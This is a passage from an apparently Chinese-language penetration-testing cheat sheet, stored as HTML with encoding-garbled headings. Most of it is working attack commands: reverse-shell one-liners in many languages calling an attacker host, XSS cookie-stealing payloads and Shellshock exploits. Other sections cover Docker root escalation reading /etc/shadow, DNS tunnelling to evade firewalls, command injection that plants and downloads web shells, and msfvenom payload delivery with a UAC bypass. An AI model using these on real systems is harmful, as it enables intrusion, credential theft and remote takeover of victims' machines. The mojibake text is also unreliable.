<p>cat <span class="hljs-params">&lt;<span class="hljs-variable">&amp;5</span> | while read line; do $line <span class="hljs-number">2</span>&gt;</span><span class="hljs-variable">&amp;5</span> &gt;<span class="hljs-variable">&amp;5</span>; done <span class="hljs-meta"># or:</span><br>while read line <span class="hljs-number">0</span><span class="hljs-params">&lt;<span class="hljs-variable">&amp;5</span>; do $line <span class="hljs-number">2</span>&gt;</span><span class="hljs-variable">&amp;5</span> &gt;<span class="hljs-variable">&amp;5</span>; done</p>
<p><span class="hljs-meta-keyword">/bin/</span>bash -i &gt; <span class="hljs-meta-keyword">/dev/</span>tcp<span class="hljs-meta-keyword">/attackerip/</span><span class="hljs-number">8080</span> <span class="hljs-number">0</span><span class="hljs-params">&lt;<span class="hljs-variable">&amp;1</span> <span class="hljs-number">2</span>&gt;</span><span class="hljs-variable">&amp;1</span><br><span class="hljs-meta-keyword">/bin/</span>bash -i &gt; <span class="hljs-meta-keyword">/dev/</span>tcp/X.X.X.X/<span class="hljs-number">443</span> <span class="hljs-number">0</span><span class="hljs-params">&lt;<span class="hljs-variable">&amp;1</span> <span class="hljs-number">2</span>&gt;</span><span class="hljs-variable">&amp;1</span><br></code></pre></div></p>
<h3><span id="perl-shell">PERL åå¼¹ Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">perl</span> -MIO -e <span class="hljs-string">'<span class="hljs-variable">$p</span>=fork;exit,if(<span class="hljs-variable">$p</span>);<span class="hljs-variable">$c</span>=new IO::Socket::INET(PeerAddr,"attackerip:443");STDIN-&gt;fdopen(<span class="hljs-variable">$c</span>,r);$~-&gt;fdopen(<span class="hljs-variable">$c</span>,w);system<span class="hljs-variable">$_</span> while&lt;&gt;;'</span>

<p><span class="hljs-comment"># Win å¹³å°</span><br>perl -MIO -e <span class="hljs-string">â€˜<span class="hljs-variable">$c</span>=new IO::Socket::INET(PeerAddr,â€attackerip:4444â€);STDIN-&gt;fdopen(<span class="hljs-variable">$c</span>,r);$~-&gt;fdopen(<span class="hljs-variable">$c</span>,w);system<span class="hljs-variable">$_</span> while&lt;&gt;;â€™</span><br>perl -e <span class="hljs-string">â€˜use Socket;<span class="hljs-variable">$i</span>=â€10.0.0.1â€;<span class="hljs-variable">$p</span>=1234;socket(S,PF_INET,SOCK_STREAM,getprotobyname(â€œtcpâ€));if(connect(S,sockaddr_in(<span class="hljs-variable">$p</span>,inet_aton(<span class="hljs-variable">$i</span>)))){open(STDIN,â€&gt;&amp;Sâ€);open(STDOUT,â€&gt;&amp;Sâ€);open(STDERR,â€&gt;&amp;Sâ€);exec(â€œ/bin/sh -iâ€);};â€™<br></span></code></pre></div></p>
<h3><span id="ruby-shell">RUBY åå¼¹ Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">ruby</span> -rsocket -e 'exit if fork;c=TCPSocket.new(<span class="hljs-string">"attackerip"</span>,<span class="hljs-string">"443"</span>);while(cmd=c.gets);IO.popen(cmd,<span class="hljs-string">"r"</span>){|io|c.print io.read}end'

<p><span class="hljs-comment"># Win å¹³å°</span><br><span class="hljs-attribute">ruby</span> -rsocket -e â€˜c=TCPSocket.new(<span class="hljs-string">â€œattackeripâ€</span>,<span class="hljs-string">â€œ443â€</span>);while(cmd=c.gets);IO.popen(cmd,<span class="hljs-string">â€œrâ€</span>){|io|c.print io.read}endâ€™<br><span class="hljs-attribute">ruby</span> -rsocket -e â€˜f=TCPSocket.open(<span class="hljs-string">â€œattackeripâ€</span>,<span class="hljs-string">â€œ443â€</span>).to_i;exec sprintf(<span class="hljs-string">â€œ/bin/sh -i &lt;&amp;%d &gt;&amp;%d 2&gt;&amp;%dâ€</span>,f,f,f)â€™<br></code></pre></div></p>
<h3><span id="python-shell-2">PYTHON åå¼¹ Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((<span class="hljs-string">"attackerip"</span>,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([<span class="hljs-string">"/bin/sh"</span>,<span class="hljs-string">"-i"</span>]);'
</code></pre></div>
<h3><span id="php-shell">PHP åå¼¹ Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs nginx"><span class="hljs-attribute">php</span> -r <span class="hljs-string">'<span class="hljs-variable">$sock</span>=fsockopen("attackerip",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span>
</code></pre></div>
<h3><span id="java-shell">JAVA åå¼¹ Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs python">r = Runtime.getRuntime()
p = r.exec([<span class="hljs-string">"/bin/bash"</span>,<span class="hljs-string">"-c"</span>,<span class="hljs-string">"exec 5&lt;&gt;/dev/tcp/attackerip/443;cat &lt;&amp;5 | while read line; do \$line 2&gt;&amp;5 &gt;&amp;5; done"</span>] <span class="hljs-keyword">as</span> String[])
p.waitFor()
</code></pre></div>
<h3><span id="netcat-shell">NETCAT åå¼¹ Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts">nc -e <span class="hljs-meta-keyword">/bin/</span>sh attackerip <span class="hljs-number">4444</span>
nc -e <span class="hljs-meta-keyword">/bin/</span>sh <span class="hljs-number">192.168</span><span class="hljs-number">.37</span><span class="hljs-number">.10</span> <span class="hljs-number">443</span>

<p><span class="hljs-meta"># å¦‚æœ -e å‚æ•°è¢«ç¦ç”¨ï¼Œå¯ä»¥å°è¯•ä»¥ä¸‹å‘½ä»¤</span><br><span class="hljs-meta"># mknod backpipe p &amp;&amp; nc attackerip 443 0&lt;backpipe | /bin/bash 1&gt;backpipe</span><br><span class="hljs-meta-keyword">/bin/</span>sh | nc attackerip <span class="hljs-number">443</span><br>rm -f <span class="hljs-meta-keyword">/tmp/</span>p; mknod <span class="hljs-meta-keyword">/tmp/</span>p p &amp;&amp; nc attackerip <span class="hljs-number">4443</span> <span class="hljs-number">0</span><span class="hljs-meta-keyword">/tmp/</span></p>
<p><span class="hljs-meta"># å¦‚æœä½ å®‰è£…é”™äº† netcat çš„ç‰ˆæœ¬ï¼Œè¯·å°è¯•ä»¥ä¸‹å‘½ä»¤</span><br>rm <span class="hljs-meta-keyword">/tmp/</span>f;mkfifo <span class="hljs-meta-keyword">/tmp/</span>f;cat <span class="hljs-meta-keyword">/tmp/</span>f|<span class="hljs-meta-keyword">/bin/</span>sh -i <span class="hljs-number">2</span>&gt;<span class="hljs-variable">&amp;1</span>|nc attackerip &gt;<span class="hljs-meta-keyword">/tmp/</span>f<br></code></pre></div></p>
<h3><span id="telnet-shell">TELNET åå¼¹ Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-meta"># å¦‚æœ netcat ä¸å¯ç”¨æˆ–è€… /dev/tcp</span>
mknod backpipe p &amp;&amp; telnet attackerip <span class="hljs-number">443</span> <span class="hljs-number">0</span><span class="hljs-params">&lt;backpipe | /bin/bash <span class="hljs-number">1</span>&gt;</span>backpipe
</code></pre></div>
<h3><span id="xterm-shell">XTERM åå¼¹ Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs dts"><span class="hljs-meta"># http:<span class="hljs-comment">//baike.baidu.com/view/418628.htm</span></span>
<span class="hljs-meta"># å¼€å¯ X æœåŠ¡å™¨ (:1 â€“ ç›‘å¬ TCP ç«¯å£ 6001)</span>
apt-get install xnest
Xnest :<span class="hljs-number">1</span>

<p><span class="hljs-meta"># è®°å¾—æˆæƒæ¥è‡ªç›®æ ‡ IP çš„è¿æ¥</span><br>xterm -display <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">1</span></p>
<p><span class="hljs-meta"># æˆæƒè®¿é—®</span><br>xhost +targetip</p>
<p><span class="hljs-meta"># åœ¨ç›®æ ‡æœºå™¨ä¸Šè¿æ¥å›æˆ‘ä»¬çš„ X æœåŠ¡å™¨</span><br>xterm -display attackerip:<span class="hljs-number">1</span><br><span class="hljs-meta-keyword">/usr/</span>openwin<span class="hljs-meta-keyword">/bin/</span>xterm -display attackerip:<span class="hljs-number">1</span><br>or<br>$ DISPLAY=attackerip:<span class="hljs-number">0</span> xterm<br></code></pre></div></p>
<h3><span id="xss">XSS å¤‡å¿˜å½•</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs php">https:<span class="hljs-comment">//www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet</span>
(<span class="hljs-string">"&lt; iframes &gt; src=http://IP:PORT &lt;/ iframes &gt;"</span>)

<p>&lt;script&gt;document.location=http:<span class="hljs-comment">//IP:PORT&lt;/script&gt;</span></p>
<p><span class="hljs-string">â€˜;alert(String.fromCharCode(88,83,83))//&#39;;alert(String.fromCharCode(88,83,83))//â€œ;alert(String.fromCharCode(88,83,83))//&quot;;alert(String.fromCharCode(88,83,83))//â€“&gt;&lt;/SCRIPT&gt;â€&gt;â€™</span>&gt;&lt;SCRIPT&gt;alert(String.fromCharCode(<span class="hljs-number">88</span>,<span class="hljs-number">83</span>,<span class="hljs-number">83</span>))&lt;/SCRIPT&gt;</p>
<p><span class="hljs-string">â€œ;!â€“â€</span>&lt;XSS&gt;=&amp;amp;amp;{()}</p>
<p>&lt;IMG SRC=<span class="hljs-string">â€œjavascript:alert(â€˜XSSâ€™);â€</span>&gt;<br>&lt;IMG SRC=javascript:alert(<span class="hljs-string">â€˜XSSâ€™</span>)&gt;<br>&lt;IMG <span class="hljs-string">â€œâ€</span><span class="hljs-string">â€œ&gt;&lt;SCRIPT&gt;alert(â€œ</span>XSS<span class="hljs-string">â€œ)&lt;/SCRIPT&gt;â€</span><span class="hljs-string">â€œ&gt;<br>&lt;IMG SRC=&amp;amp;amp;#106;&amp;amp;amp;#97;&amp;amp;amp;#118;&amp;amp;amp;#97;&amp;amp;amp;#115;&amp;amp;amp;#99;&amp;amp;amp;#114;&amp;amp;amp;#105;&amp;amp;amp;#112;&amp;amp;amp;#116;&amp;amp;amp;#58;&amp;amp;amp;#97;&amp;amp;amp;#108;&amp;amp;amp;#101;&amp;amp;amp;#114;&amp;amp;amp;#116;&amp;amp;amp;#40;&amp;amp;amp;#39;&amp;amp;amp;#88;&amp;amp;amp;#83;&amp;amp;amp;#83;&amp;amp;amp;#39;&amp;amp;amp;#41;&gt;</p>
<p>&lt;IMG SRC=&amp;amp;amp;#0000106&amp;amp;amp;#0000097&amp;amp;amp;#0000118&amp;amp;amp;#0000097&amp;amp;amp;#0000115&amp;amp;amp;#0000099&amp;amp;amp;#0000114&amp;amp;amp;#0000105&amp;amp;amp;#0000112&amp;amp;amp;#0000116&amp;amp;amp;#0000058&amp;amp;amp;#0000097&amp;amp;amp;#0000108&amp;amp;amp;#0000101&amp;amp;amp;#0000114&amp;amp;amp;#0000116&amp;amp;amp;#0000040&amp;amp;amp;#0000039&amp;amp;amp;#0000088&amp;amp;amp;#0000083&amp;amp;amp;#0000083&amp;amp;amp;#0000039&amp;amp;amp;#0000041&gt;<br>&lt;IMG SRC=â€</span>jav ascript:alert(<span class="hljs-string">â€˜XSSâ€™</span>);<span class="hljs-string">â€œ&gt;</p>
<p>perl -e â€˜print â€œ</span>&lt;IMG SRC=javascript:alert(&lt;span class=â€hljs-stringâ€&gt;â€XSS&quot;)&gt;â€</span>;<span class="hljs-string">â€˜ &gt; out</p>
<p>&lt;BODY onload!#$%&amp;amp;()*~+-_.,:;?@[/|]^`=alert(â€œXSSâ€)&gt;</p>
<p>(â€œ&gt;&lt; iframes <a href="http://google.com" target="_blank" rel="noopener">http://google.com</a> &lt; iframes &gt;)</p>
<p>&lt;BODY BACKGROUND=â€javascript:alert(â€˜</span>XSS<span class="hljs-string">â€˜)â€&gt;<br>&lt;FRAMESET&gt;&lt;FRAME SRC=â€javascript:alert(â€˜</span>XSS<span class="hljs-string">â€˜);â€&gt;&lt;/FRAMESET&gt;<br>â€œ&gt;&lt;script &gt;alert(document.cookie)&lt;/script&gt;<br>%253cscript%253ealert(document.cookie)%253c/script%253e<br>â€œ&gt;&lt;sâ€%2bâ€cript&gt;alert(document.cookie)&lt;/script&gt;<br>%22/%3E%3CBODY%20onload=â€™document.write(%22%3Cs%22%2b%22cript%20src=<a href="http://my.box.com/xss.js%3E%3C/script%3E%22)&#39;" target="_blank" rel="noopener">http://my.box.com/xss.js%3E%3C/script%3E%22)&#39;</a></span>%<span class="hljs-number">3</span>E<br>&lt;img src=asdf onerror=alert(document.cookie)&gt;<br></code></pre></div></p>
<h3><span id="ssh-over-sctp-socat">SSH Over SCTP (ä½¿ç”¨ Socat)</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># è¿œç«¯æœåŠ¡å™¨</span>
<span class="hljs-comment"># å‡è®¾ä½ å‡†å¤‡è®© SCTP socket ç›‘å¬ç«¯å£ 80/SCTP å¹¶ä¸” sshd ç«¯å£åœ¨ 22/TCP</span>
$ socat SCTP-<span class="hljs-symbol">LISTEN:</span><span class="hljs-number">80</span>,fork <span class="hljs-symbol">TCP:</span><span class="hljs-symbol">localhost:</span><span class="hljs-number">22</span>

<p><span class="hljs-comment"># æœ¬åœ°ç«¯</span><br><span class="hljs-comment"># å°† SERVER_IP æ¢æˆè¿œç«¯æœåŠ¡å™¨çš„åœ°å€ï¼Œç„¶åå°† 80 æ¢æˆ SCTP ç›‘å¬çš„ç«¯å£å·</span><br>$ socat TCP-<span class="hljs-symbol">LISTEN:</span><span class="hljs-number">1337</span>,fork <span class="hljs-symbol">SCTP:</span><span class="hljs-symbol">SERVER_IP:</span><span class="hljs-number">80</span></p>
<p><span class="hljs-comment"># åˆ›å»º socks ä»£ç†</span><br><span class="hljs-comment"># æ›¿æ¢ username å’Œ -p çš„ç«¯å£å·</span><br>$ ssh -lusername localhost -D <span class="hljs-number">8080</span> -p <span class="hljs-number">1337</span><br></code></pre></div></p>
<p>ä½¿ç”¨æ´‹è‘±ç½‘ç»œ</p>
<div class="hljs code-wrapper"><pre><code class="hljs sql"># å®‰è£…æœåŠ¡
$ apt-get <span class="hljs-keyword">install</span> tor torsocks

<h1 id="ç»‘å®š-ssh-åˆ°-tor-æœåŠ¡ç«¯å£-80"><a href="#ç»‘å®š-ssh-åˆ°-tor-æœåŠ¡ç«¯å£-80" class="headerlink" title="ç»‘å®š ssh åˆ° tor æœåŠ¡ç«¯å£ 80"></a>ç»‘å®š ssh åˆ° tor æœåŠ¡ç«¯å£ <span class="hljs-number">80</span></h1><h1 id="etc-tor-torrc"><a href="#etc-tor-torrc" class="headerlink" title="/etc/tor/torrc"></a>/etc/tor/torrc</h1><p>SocksPolicy <span class="hljs-keyword">accept</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span><br>SocksPolicy <span class="hljs-keyword">accept</span> <span class="hljs-number">192.168</span><span class="hljs-number">.0</span><span class="hljs-number">.0</span>/<span class="hljs-number">16</span><br><span class="hljs-keyword">Log</span> <span class="hljs-keyword">notice</span> <span class="hljs-keyword">file</span> /<span class="hljs-keyword">var</span>/<span class="hljs-keyword">log</span>/tor/notices.<span class="hljs-keyword">log</span><br>RunAsDaemon <span class="hljs-number">1</span><br>HiddenServiceDir /<span class="hljs-keyword">var</span>/lib/tor/ssh_hidden_service/<br>HiddenServicePort <span class="hljs-number">80</span> <span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>:<span class="hljs-number">22</span><br>PublishServerDescriptor <span class="hljs-number">0</span><br>$ /etc/init.<span class="hljs-keyword">d</span>/tor <span class="hljs-keyword">start</span><br>$ cat /<span class="hljs-keyword">var</span>/lib/tor/ssh_hidden_service/hostname<br><span class="hljs-number">3</span>l5zstvt1zk5jhl662.onion</p>
<h1 id="ssh-å®¢æˆ·ç«¯è¿æ¥"><a href="#ssh-å®¢æˆ·ç«¯è¿æ¥" class="headerlink" title="ssh å®¢æˆ·ç«¯è¿æ¥"></a>ssh å®¢æˆ·ç«¯è¿æ¥</h1><p>$ apt-<span class="hljs-keyword">get</span> <span class="hljs-keyword">install</span> torsocks<br>$ torsocks ssh login@<span class="hljs-number">3</span>l5zstvt1zk5jhl662.onion -<span class="hljs-keyword">p</span> <span class="hljs-number">80</span><br></code></pre></div></p>
<h3><span id="metagoofil-8211">Metagoofil â€“ å…ƒæ•°æ®æ”¶é›†å·¥å…·</span></h3>
<p>æ³¨ï¼šMetagoofil æ˜¯ä¸€æ¬¾åˆ©ç”¨Googleæ”¶é›†ä¿¡æ¯çš„å·¥å…·ã€‚</p>
<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># http://www.edge-security.com/metagoofil.php</span>
<span class="hljs-comment"># å®ƒå¯ä»¥è‡ªåŠ¨åœ¨æœç´ å¼•æ“ä¸­æ£€ç´¢å’Œåˆ†ææ–‡ä»¶ï¼Œè¿˜å…·æœ‰æä¾›Macåœ°å€ï¼Œç”¨æˆ·ååˆ—è¡¨ç­‰å…¶ä»–åŠŸèƒ½</span>
$ python metagoofil.py <span class="hljs-_">-d</span> example.com -t doc,pdf <span class="hljs-_">-l</span> 200 -n 50 -o examplefiles <span class="hljs-_">-f</span> results.html
</code></pre></div>
<h3><span id="-shellshock">åˆ©ç”¨ Shellshock</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs bash"><span class="hljs-comment"># ä¸€ä¸ªå‘ç°å¹¶åˆ©ç”¨æœåŠ¡å™¨ Shellshock çš„å·¥å…·</span>
<span class="hljs-comment"># https://github.com/nccgroup/shocker</span>
$ ./shocker.py -H 192.168.56.118  --command <span class="hljs-string">"/bin/cat /etc/passwd"</span> -c /cgi-bin/status --verbose

<p><span class="hljs-comment"># æŸ¥çœ‹æ–‡ä»¶</span><br>$ <span class="hljs-built_in">echo</span> <span class="hljs-_">-e</span> <span class="hljs-string">â€œHEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; echo $(&lt;/etc/passwd)\r\nHost: vulnerable\r\nConnection: close\r\n\r\nâ€</span> | nc 192.168.56.118 80</p>
<p><span class="hljs-comment"># ç»‘å®š shell</span><br>$ <span class="hljs-built_in">echo</span> <span class="hljs-_">-e</span> <span class="hljs-string">â€œHEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc -l -p 9999 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\nâ€</span> | nc 192.168.56.118 80</p>
<p><span class="hljs-comment"># åå¼¹ Shell</span><br>$ nc <span class="hljs-_">-l</span> -p 443<br>$ <span class="hljs-built_in">echo</span> <span class="hljs-string">â€œHEAD /cgi-bin/status HTTP/1.1\r\nUser-Agent: () { :;}; /usr/bin/nc 192.168.56.103 443 -e /bin/sh\r\nHost: vulnerable\r\nConnection: close\r\n\r\nâ€</span> | nc 192.168.56.118 80<br></code></pre></div></p>
<h3><span id="-docker-root">è·å– Docker çš„ Root</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># è·å–  Docker çš„ Root</span>
<span class="hljs-comment"># user å¿…é¡»åœ¨ docker ç”¨æˆ·ç»„ä¸­</span>
ek@victum<span class="hljs-symbol">:~/docker-test</span>$ id
uid=<span class="hljs-number">1001</span>(ek) gid=<span class="hljs-number">1001</span>(ek) groups=<span class="hljs-number">1001</span>(ek),<span class="hljs-number">114</span>(docker)

<p>ek@victum<span class="hljs-symbol">:<del></span>$ mkdir docker-test<br>ek@victum<span class="hljs-symbol">:</del></span>$ cd docker-test</p>
<p>ek@victum<span class="hljs-symbol">:~</span>$ cat &gt; Dockerfile<br>FROM <span class="hljs-symbol">debian:</span>wheezy</p>
<p>ENV WORKDIR /stuff</p>
<p>RUN mkdir -p $WORKDIR</p>
<p>VOLUME [ $WORKDIR ]</p>
<p>WORKDIR $WORKDIR<br>&lt;&lt; EOF</p>
<p>ek@victum<span class="hljs-symbol">:<del></span>$ docker build -t my-docker-image .<br>ek@victum<span class="hljs-symbol">:</del></span>$ docker run -v $PWD<span class="hljs-symbol">:/stuff</span> -t my-docker-image /bin/sh -c <br><span class="hljs-string">â€˜cp /bin/sh /stuff &amp;&amp; chown root.root /stuff/sh &amp;&amp; chmod a+s /stuff/shâ€™</span><br>./sh<br>whoami<br><span class="hljs-comment"># root</span></p>
<p>ek@victum<span class="hljs-symbol">:~</span>$ docker run -v /<span class="hljs-symbol">etc:</span>/stuff -t my-docker-image /bin/sh -c <span class="hljs-string">â€˜cat /stuff/shadowâ€™</span><br></code></pre></div></p>
<h3><span id="-dns">ä½¿ç”¨ DNS éš§é“ç»•è¿‡é˜²ç«å¢™</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># è®©æ•°æ®å’Œå‘½ä»¤ä½¿ç”¨ DNS éš§é“ä¼ è¾“ä»¥ç»•è¿‡é˜²ç«å¢™çš„æ£€æŸ¥</span>
<span class="hljs-comment"># dnscat2 æ”¯æŒä»ç›®æ ‡ä¸»æœºä¸Šé¢ä¸Šä¼ å’Œä¸‹è½½å‘½ä»¤æ¥è·å–æ–‡ä»¶ã€æ•°æ®å’Œç¨‹åº</span>

<p><span class="hljs-comment"># æœåŠ¡å™¨ (æ”»å‡»è€…)</span><br>$ apt-get update<br>$ apt-get -y install ruby-dev git make g++<br>$ gem install bundler<br>$ git clone <span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/iagox</span>86/dnscat2.git<br>$ cd dnscat2/server<br>$ bundle install<br>$ ruby ./dnscat2.rb<br>dnscat2&gt; New session <span class="hljs-symbol">established:</span> <span class="hljs-number">16059</span><br>dnscat2&gt; session -i <span class="hljs-number">16059</span></p>
<p><span class="hljs-comment"># å®¢æˆ·æœº (ç›®æ ‡)</span><br><span class="hljs-comment"># <a href="https://downloads.skullsecurity.org/dnscat2/" target="_blank" rel="noopener">https://downloads.skullsecurity.org/dnscat2/</a></span><br><span class="hljs-comment"># <a href="https://github.com/lukebaggett/dnscat2-powershell" target="_blank" rel="noopener">https://github.com/lukebaggett/dnscat2-powershell</a></span><br>$ dnscat â€“host &lt;dnscat server_ip&gt;<br></code></pre></div></p>
<h3><span id="-assemble">ç¼–è¯‘ Assemble ä»£ç </span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby">$ nasm -f elf32 simple32.asm -o simple32.o
$ ld -m elf_i386 simple32.o simple32

<p>$ nasm -f elf64 simple.asm -o simple.o<br>$ ld simple.o -o simple<br></code></pre></div></p>
<h3><span id="-shell">ä½¿ç”¨éäº¤äº’ Shell æ‰“å…¥å†…ç½‘</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby"><span class="hljs-comment"># ç”Ÿæˆ shell ä½¿ç”¨çš„ ssh å¯†é’¥</span>
$ wget -O - -q <span class="hljs-string">"http://domain.tk/sh.php?cmd=whoami"</span>
$ wget -O - -q <span class="hljs-string">"http://domain.tk/sh.php?cmd=ssh-keygen -f /tmp/id_rsa -N \"\" "</span>
$ wget -O - -q <span class="hljs-string">"http://domain.tk/sh.php?cmd=cat /tmp/id_rsa"</span>

<p><span class="hljs-comment"># å¢åŠ ç”¨æˆ· tempuser </span><br>$ useradd -m tempuser<br>$ mkdir /home/tempuser/.ssh &amp;&amp; chmod <span class="hljs-number">700</span> /home/tempuser/.ssh<br>$ wget -O - -q <span class="hljs-string">â€œ<a href="http://domain.tk/sh.php?cmd=cat" target="_blank" rel="noopener">http://domain.tk/sh.php?cmd=cat</a> /tmp/id_rsaâ€</span> &gt; <span class="hljs-regexp">/home/tempuser</span><span class="hljs-regexp">/.ssh/authorized</span>_keys<br>$ chmod <span class="hljs-number">700</span> /home/tempuser/.ssh/authorized_keys<br>$ chown -R <span class="hljs-symbol">tempuser:</span>tempuser /home/tempuser/.ssh</p>
<p><span class="hljs-comment"># åå¼¹ ssh shell</span><br>$ wget -O - -q <span class="hljs-string">â€œ<a href="http://domain.tk/sh.php?cmd=ssh" target="_blank" rel="noopener">http://domain.tk/sh.php?cmd=ssh</a> -i /tmp/id_rsa -o StrictHostKeyChecking=no -R 127.0.0.1:8080:192.168.20.13:8080 -N -f tempuser@&lt;attacker_ip&gt;â€</span><br></code></pre></div></p>
<h3><span id="-post-shell">åˆ©ç”¨ POST è¿œç¨‹å‘½ä»¤æ‰§è¡Œè·å– Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">attacker</span>:~$ curl -i -s -k  -X 'POST' --data-binary $'IP=<span class="hljs-number">%3</span>Bwhoami&amp;submit=submit' 'http://victum.tk/command.php'

<p><span class="hljs-attribute">attacker</span>:~$ curl -i -s -k  -X â€˜POSTâ€™ â€“data-binary $â€™IP=<span class="hljs-number">%3</span>Becho+<span class="hljs-number">%27</span><span class="hljs-number">%3</span>C<span class="hljs-number">%3</span>Fphp+system<span class="hljs-number">%28</span><span class="hljs-number">%24</span>_GET<span class="hljs-number">%5</span>B<span class="hljs-number">%22</span>cmd<span class="hljs-number">%22</span><span class="hljs-number">%5</span>D<span class="hljs-number">%29</span><span class="hljs-number">%3</span>B+<span class="hljs-number">%3</span>F<span class="hljs-number">%3</span>E<span class="hljs-number">%27</span>+<span class="hljs-number">%3</span>E+..<span class="hljs-number">%2</span>Fshell.php&amp;submit=submitâ€™ â€˜<a href="http://victum.tk/command.php&#39;" target="_blank" rel="noopener">http://victum.tk/command.php&#39;</a></p>
<p><span class="hljs-attribute">attacker</span>:~$ curl <a href="http://victum.tk/shell.php?cmd=id" target="_blank" rel="noopener">http://victum.tk/shell.php?cmd=id</a></p>
<p><span class="hljs-comment"># åœ¨æœåŠ¡å™¨ä¸Šä¸‹è½½ shell (phpshell.php)</span></p>
<p><span class="hljs-attribute">http</span>://victum.tk/shell.php?cmd=php<span class="hljs-number">%20</span>-r<span class="hljs-number">%20</span><span class="hljs-number">%27</span>file_put_contents<span class="hljs-number">%28</span><span class="hljs-number">%22</span>phpshell.php<span class="hljs-number">%22</span>,<span class="hljs-number">%20</span>fopen<span class="hljs-number">%28</span><span class="hljs-number">%22</span><a href="http://attacker.tk/phpshell.txt" target="_blank" rel="noopener">http://attacker.tk/phpshell.txt</a><span class="hljs-number">%22</span>,<span class="hljs-number">%20</span><span class="hljs-number">%27</span>r<span class="hljs-number">%27</span><span class="hljs-number">%29</span><span class="hljs-number">%29</span>;<span class="hljs-number">%27</span></p>
<p><span class="hljs-comment"># è¿è¡Œ nc å¹¶æ‰§è¡Œ phpshell.php</span><br><span class="hljs-attribute">attacker</span>:~$ nc -nvlp 1337<br></code></pre></div></p>
<h3><span id="-win7-shell">ä»¥ç®¡ç†å‘˜èº«ä»½åœ¨ Win7 ä¸Šåå¼¹å…·æœ‰ç³»ç»Ÿæƒé™çš„ Shell</span></h3>
<div class="hljs code-wrapper"><pre><code class="hljs ruby">msfvenom â€“p windows/shell_reverse_tcp LHOST=<span class="hljs-number">192.168</span>.<span class="hljs-number">56.102</span> â€“f exe &gt; danger.exe

<p><span class="hljs-comment"># æ˜¾ç¤ºè´¦æˆ·é…ç½®</span><br>net user &lt;login&gt;</p>
<p><span class="hljs-comment"># Kali ä¸Šä¸‹è½½ psexec</span></p>
<p><span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/technet.microsoft.com/en</span>-us/sysinternals/bb897553.aspx</p>
<p><span class="hljs-comment"># ä½¿ç”¨ powershell è„šæœ¬ä¸Šä¼  psexec.exe åˆ°ç›®æ ‡æœºå™¨</span><br>echo $client = New-Object System.Net.WebClient &gt; script.ps1<br>echo $targetlocation = <span class="hljs-string">â€œ<a href="http://192.168.56.102/PsExec.exe&quot;" target="_blank" rel="noopener">http://192.168.56.102/PsExec.exe&quot;</a></span> <span class="hljs-meta">&gt;&gt; </span>script.ps1<br>echo $client.DownloadFile($targetlocation,<span class="hljs-string">â€œpsexec.exeâ€</span>) <span class="hljs-meta">&gt;&gt; </span>script.ps1<br>powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script.ps1</p>
<p><span class="hljs-comment"># ä½¿ç”¨ powershell è„šæœ¬ä¸Šä¼  danger.exe åˆ°ç›®æ ‡æœºå™¨</span><br>echo $client = New-Object System.Net.WebClient &gt; script2.ps1<br>echo $targetlocation = <span class="hljs-string">â€œ<a href="http://192.168.56.102/danger.exe&quot;" target="_blank" rel="noopener">http://192.168.56.102/danger.exe&quot;</a></span> <span class="hljs-meta">&gt;&gt; </span>script2.ps1<br>echo $client.DownloadFile($targetlocation,<span class="hljs-string">â€œdanger.exeâ€</span>) <span class="hljs-meta">&gt;&gt; </span>script2.ps1<br>powershell.exe -ExecutionPolicy Bypass -NonInteractive -File script2.ps1</p>
<p><span class="hljs-comment"># ä½¿ç”¨é¢„ç¼–è¯‘çš„äºŒè¿›åˆ¶æ–‡ä»¶ç»•è¿‡ UAC:</span></p>
<p><span class="hljs-symbol">https:</span>/<span class="hljs-regexp">/github.com/hfiref</span>0x/UACME</p>
